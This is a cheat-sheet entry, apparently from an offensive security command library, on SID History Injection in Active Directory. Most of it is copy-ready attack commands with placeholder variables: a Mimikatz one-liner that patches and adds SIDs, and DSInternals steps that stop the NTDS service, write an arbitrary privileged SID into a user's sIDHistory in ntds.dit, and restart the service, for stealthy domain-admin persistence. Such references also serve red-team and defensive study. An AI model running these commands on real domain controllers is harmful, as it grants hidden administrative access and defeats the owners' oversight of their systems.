---
technique: SID History Injection
category: persistence
targets: User Accounts, Domain Controllers (LSASS/NTDS)
protocols: NTLM, Kerberos, LDAP
remote_capable: false
tags: persistence sid-history mimikatz dsinternals ntds privilege-escalation stealth
---

# SID History Injection

The `sIDHistory` attribute on an AD user or group object is intended for domain migration, it retains old SIDs so access to resources is preserved. Attackers with DA or SYSTEM on a DC can inject an arbitrary SID (e.g. the Domain Admins group SID or S-1-5-21-...-500) into a normal user's SID history, causing the system to treat that user as a member of the target group during access checks without any visible group membership change.

## Windows

Mimikatz covers pre-Windows 2016 DCs. DSInternals (direct NTDS manipulation) covers 2016+ but requires stopping the NTDS service.

### Mimikatz (pre-2016)

#powershell #mimikatz #sid #da-required

Inject a target SID into the SID history of a controlled user on a pre-Windows 2016 DC.

```powershell title:"Inject SID into user SID history with Mimikatz (pre-2016 DC)"
.\mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:$target_user /new:$sid_to_inject"
```
<!-- cheat
var target_user
var sid_to_inject
-->

### Step 1: Enumerate the target user (DSInternals)

#powershell #dsinternals #recon

Look up the target user account before stopping the NTDS service for SID history injection.

```powershell title:"Enumerate target user with RSAT AD module before NTDS manipulation"
Get-ADUser -Identity "$interesting_user"
```
<!-- cheat
var interesting_user
-->

### Step 2: Stop the NTDS service (DSInternals)

#powershell #dsinternals #disruptive

Stop the NTDS service to allow direct manipulation of the NTDS database file.

```powershell title:"Stop the NTDS service for NTDS database manipulation"
Stop-Service NTDS -Force
```
<!-- cheat -->

### Step 3: Inject SID into NTDS database (DSInternals)

#powershell #dsinternals #ntds #disruptive

Write the target SID into the user's sIDHistory attribute directly in the NTDS database.

```powershell title:"Inject SID into user sIDHistory via DSInternals NTDS manipulation"
Add-ADDBSidHistory -SamAccountName "$target_user" -SidHistory "$sid_to_inject" -DBPath C:\Windows\ntds\ntds.dit -Force
```
<!-- cheat
var target_user
var sid_to_inject
-->

### Step 4: Start the NTDS service (DSInternals)

#powershell #dsinternals #disruptive

Restart the NTDS service after completing NTDS database manipulation.

```powershell title:"Restart the NTDS service after NTDS database modification"
Start-Service NTDS
```
<!-- cheat -->

## Linux

SID history injection requires manipulating LSASS memory or the NTDS database directly on the DC, which is not achievable purely from a Linux host without a prior interactive session on the DC.
